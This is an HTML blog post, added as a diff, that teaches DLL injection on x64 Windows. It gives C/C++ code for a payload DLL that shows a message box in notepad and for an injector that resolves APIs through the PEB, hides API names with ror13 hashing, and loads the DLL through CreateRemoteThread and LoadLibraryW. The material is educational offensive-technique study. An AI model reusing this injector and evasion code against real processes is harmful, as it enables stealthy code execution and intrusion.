@@ -1,0 +1,333 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="post-status" content="active" />
+    <title>DLL Injection Sample</title>
+    <link rel="stylesheet" href="../../../assets/style.min.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;600&family=JetBrains+Mono:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="icon"
+      href="../../../assets/favicon/duck.jpg"
+      type="image/jpeg"
+    />
+    <link rel="apple-touch-icon" href="../../../assets/favicon/duck.jpg" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css"
+    />
+  </head>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/x86asm.min.js"></script>
+  <body>
+    <main class="container post-page" data-category="">
+      <a class="back-link" id="backLink" href="index.html">← All Posts</a>
+      <header class="post-header">
+        <h1 class="post-title">DLL Injection Sample</h1>
+        <div class="post-meta">2026-03-15</div>
+      </header>
+      <article class="post-content">
+        <section>
+          <p>
+            <span class="title-highlight">Overview:</span>
+            It is still some offensive techique that I pay my attention in.
+            <a
+              class="highlight"
+              href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection"
+              >DLL Injection</a
+            >, goal is attempts to load DLL into a remote process
+          </p>
+          <p>This sample was created on the x64 architecture.</p>
+        </section>
+        <!-- outline -->
+        <section>
+          <ul>
+            <li>
+              <a href="#technique" class="highlight"
+                >Understand the technique</a
+              >
+            </li>
+            <li>
+              <a href="#dll" class="highlight">Implement Payload - DLL </a>
+            </li>
+            <li>
+              <a href="#injector" class="highlight">Implement Injector </a>
+            </li>
+          </ul>
+        </section>
+        <!-- understand techique  -->
+        <section>
+          <p>
+            The picture below explained
+            <span id="technique" class="title-highlight"
+              >how the technique works.</span
+            >
+          </p>
+          <div class="image-container">
+            <img src="./img/technique.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            If you have read my last recent post about
+            <a href="../011-2026-03-02/index.html" class="highlight"
+              >Shellcode Injection</a
+            >
+            you’ll find this technique quite similar. <br />
+            So get back to the techique, it has two main components,
+          </p>
+          <ul>
+            <li>
+              First is <span class="inline-highlight">the injector</span> ,
+              responsibility for injecting payload inside remote process.
+            </li>
+            <li>
+              Second is <span class="inline-highlight">the payload</span>,
+              responsibility for creating reverse shell to the attacker or some
+              other tasks like open message box in this post.
+            </li>
+          </ul>
+          <p>
+            This sample, the
+            <span class="inline-highlight">payload.dll</span> plays role as
+            payload, which is used for
+            <span class="inline-highlight">open a message box</span> inside
+            <span class="inline-highlight">the notepad process</span>.
+          </p>
+        </section>
+        <!-- implement payload.dll -->
+        <section>
+          <p>
+            This section will
+            <span id="dll" class="title-highlight">Implement DLL</span> -
+            Dynamic Link Library is a file containing code and data that
+            multiple different programs can use simultaneously. This part quite
+            simple
+          </p>
+          <pre class="code-block"><code class="language-cpp">//payload.dll
+#include &lt;Windows.h&gt;
+#include &lt;cstdio&gt;
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH: // execute when the dll successfully loaded into process's memory
+        char msg[100];
+        sprintf_s(msg,100,"Injection locate at %p", hModule);
+        MessageBoxA(NULL, msg , "DLL Injection", MB_OK);
+        break; 
+    case DLL_THREAD_ATTACH: // when new thread created in process's memory
+    case DLL_THREAD_DETACH:  
+    case DLL_PROCESS_DETACH: // execute when close process, or FreeLibrary
+        break;
+    }
+    return TRUE;
+}</code></pre>
+        </section>
+        <!-- injector -->
+        <section>
+          <p>
+            After we done with the payload. Then we
+            <span id="injector" class="title-highlight"
+              >implement injector</span
+            >
+            to put these payload inside notepad process
+          </p>
+          <p>
+            As usual, we need to process the
+            <span class="inline-highlight">kernel32.dll</span>
+          </p>
+          <pre class="code-block"><code class="language-cpp">// injector.c
+  PVOID get_kernel32_base() {
+	PPEB peb = (PPEB)__readgsqword(0x60);
+	PPEB_LDR_DATA loader = peb->Ldr; 
+	PLIST_ENTRY module_list = &loader->InMemoryOrderModuleList;
+	PLIST_ENTRY current_module = module_list->Flink;
+
+	while (current_module != module_list) {
+		PLDR_DATA_TABLE_ENTRY_CUSTOM module_entry = CONTAINING_RECORD(current_module, LDR_DATA_TABLE_ENTRY_CUSTOM, InMemoryOrderLinks); // move back to top of struct
+		if (module_entry->BaseDllName.Buffer != NULL) {
+			DWORD h = whash(module_entry->BaseDllName.Buffer);
+			if (h == KERNEL32_HASH) {
+				return module_entry->DllBase;
+			}
+		}
+		current_module = current_module->Flink;
+	}
+	return NULL;
+}</code></pre>
+
+          <p>
+            In this code, I did compared the string of module to constrant
+            hashed by using
+            <span class="inline-highlight">ror13 - rotate bit</span> to hide the
+            sensitive string
+          </p>
+          <pre class="code-block"><code class="language-cpp">// injector.c
+#define ror13(value) ((DWORD)((value) >> 13) | (DWORD)((value) &lt;&lt; (32 - 13)))
+__forceinline DWORD whash(const wchar_t* string) { // hash unicode 
+	DWORD h = 0;
+	while (*string) {
+		wchar_t c = *string;
+		if (c >= 'a' && c &lt;= 'z') {
+			c -= 0x20;
+		};
+		h = ror13(h);
+		h += (DWORD)c;
+
+		string++;
+	}
+	//printf("%X\n", h);
+	return h;
+}</code></pre>
+          <p>
+            The <span class="inline-highlight">__forceinline</span> to tell the
+            compiler to place this code directly below call the
+            <span class="inline-highlight">whash</span> function, so there will
+            be no <span class="inline-highlight">call instruction</span> to
+            <span class="inline-highlight">whash</span>. Hiding in ASM when
+            using hash functions multiple times.
+          </p>
+          <div class="image-container">
+            <img src="./img/forceinline.png" alt="" class="zoomImage" />
+          </div>
+          <p>
+            After process the
+            <span class="inline-highlight">kernel32.dll</span> We also need to
+            resolve the <span class="inline-highlight">GetProcAddrerss</span> as
+            well
+          </p>
+          <pre class="code-block"><code class="language-cpp">// injector.c
+PVOID resolve_get_proc() {
+//... Define the necessary variables
+PVOID kernel32_base = get_kernel32_base();
+if (!kernel32_base) return NULL;
+
+LPBYTE base_address = (LPBYTE)kernel32_base;
+p_dos_header = (PIMAGE_DOS_HEADER)base_address;
+p_nt_header = (PIMAGE_NT_HEADERS)(p_dos_header->e_lfanew +base_address);
+p_optional_header = &p_nt_header->OptionalHeader;
+
+export_rva = p_optional_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+p_export_directory = (PIMAGE_EXPORT_DIRECTORY)(export_rva + base_address);
+
+number_of_function = p_export_directory->NumberOfNames;
+
+p_function_name = (PDWORD)(p_export_directory->AddressOfNames + base_address);
+p_ords = (PWORD)(p_export_directory->AddressOfNameOrdinals + base_address);
+p_function = (PDWORD)(p_export_directory->AddressOfFunctions + base_address);
+
+for (WORD i = 0; i &lt; number_of_function; i++) {
+	char* function_name = (char*)(p_function_name[i] + base_address);
+	DWORD h = hash(function_name);
+	if (h == GETPROCADDRESS_HASH) {
+		function_index = p_ords[i];
+		return (PVOID)(p_function[function_index] + base_address);
+	}
+}
+return NULL;
+}</code></pre>
+          <p>We try resolve all functions we need</p>
+          <pre class="code-block code-block-drop"><code class="language-cpp"
+>// injector.h
+// define function pointers
+typedef PROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
+typedef HMODULE(WINAPI* LOADLIBRARYW)(LPCSTR);
+typedef HANDLE(WINAPI* OPENPROCESS)(
+	_In_ DWORD dwDesiredAccess,
+	_In_ BOOL bInheritHandle,
+	_In_ DWORD dwProcessId
+	);
+typedef LPVOID(WINAPI* VIRTUALALLOCEX)(
+	_In_ HANDLE hProcess,
+	_In_opt_ LPVOID lpAddress,
+	_In_ SIZE_T dwSize,
+	_In_ DWORD flAllocationType,
+	_In_ DWORD flProtect);
+typedef BOOL(WINAPI* WRITEPROCESSMEMORY)(
+	_In_ HANDLE hProcess,
+	_In_ LPVOID lpBaseAddress,
+	_In_reads_bytes_(nSize) LPCVOID lpBuffer,
+	_In_ SIZE_T nSize,
+	_Out_opt_ SIZE_T* lpNumberOfBytesWritten);
+
+typedef HANDLE(WINAPI* CREATEREMOTETHREAD)(
+	_In_ HANDLE hProcess,
+	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	_In_ SIZE_T dwStackSize,
+	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
+	_In_opt_ LPVOID lpParameter,
+	_In_ DWORD dwCreationFlags,
+	_Out_opt_ LPDWORD lpThreadId
+	);
+typedef BOOL(WINAPI* CLOSEHANDLE)(
+	_In_ _Post_ptr_invalid_ HANDLE hObject
+	);</code></pre>
+          <pre class="code-block"><code class="language-cpp"
+>// injector.c
+p_LoadLibraryA = (LOADLIBRARYA)p_GetProcAddress((HMODULE)kernel32, s_LoadLibraryA);
+p_LoadLibraryW = (LOADLIBRARYW)p_GetProcAddress((HMODULE)kernel32, s_LoadLlibraryW);
+p_VirtualAllocEx = (VIRTUALALLOCEX)p_GetProcAddress((HMODULE)kernel32, s_VirtualAllocEx);
+p_OpenProcess = (OPENPROCESS)p_GetProcAddress((HMODULE)kernel32, s_OpenProcess);
+p_WriteProcessMemory = (WRITEPROCESSMEMORY)p_GetProcAddress((HMODULE)kernel32, s_WriteProcessMemory);
+p_CreateRemoteThread = (CREATEREMOTETHREAD)p_GetProcAddress((HMODULE)kernel32, s_CreateRemoteThread);
+p_CloseHandle = (CLOSEHANDLE)p_GetProcAddress((HMODULE)kernel32, s_CloseHandle);</code></pre>
+          <p>As usual, pushing the string onto the stack is necessary.</p>
+        </section>
+        <section>
+          <p>
+            Lastly, with the flow we dicussed at beginning of this sample,
+            <span class="inline-hightlight">Injector</span> allocates memory
+            region in target process, then write the DLL path into it.
+          </p>
+          <pre class="code-block"><code class="language-cpp">// injector.c
+wchar_t dll_path[] = L"D:\\vs_c\\visus_dll\\x64\\Release\\payload.dll";
+int dll_size = sizeof(dll_path);
+
+HANDLE handle_process;
+PVOID remote_buffer;
+HANDLE handle_thread;
+
+handle_process = p_OpenProcess(PROCESS_ALL_ACCESS, 0, atoi(argv[1]));
+if (!handle_process) return 1;
+
+
+remote_buffer = p_VirtualAllocEx(handle_process, NULL, dll_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+if (!remote_buffer) {
+	return 1;
+};
+// write into remote_buffer the path to payload.dll
+if (!p_WriteProcessMemory(handle_process, remote_buffer, dll_path, dll_size, NULL)) return 1; </code></pre>
+          <p>
+            Next, very important detail that
+            <span class="inline-highlight">Injector</span> inits the
+            <span class="inline-highlight">thread entry</span>, pointing to
+            <span class="inline-highlight">LoadLibrary</span> function. Then
+            creates a thread with the entry we just created, whose content will
+            be the path to payload.dll.
+          </p>
+          <pre class="code-block"><code class="language-cpp">// injector.c
+PTHREAD_START_ROUTINE execute_thread = (PTHREAD_START_ROUTINE)p_LoadLibraryW; // thread entry
+
+if (!execute_thread) return 1;
+// create thread inside target's process
+if (!p_CreateRemoteThread(handle_process, 0, NULL, execute_thread, remote_buffer, 0, NULL)) return 1;</code></pre>
+          <p>The result displayed as gif below</p>
+          <div class="image-container">
+            <img src="./img/result1.gif" alt="" class="zoomImage" />
+          </div>
+        </section>
+      </article>
+      <div id="modal" class="modal">
+        <span id="closeModal" class="close-btn">&times;</span>
+      </div>
+    </main>
+    <script src="../../../assets/app.obf.js" defer></script>
+  </body>
+</html>
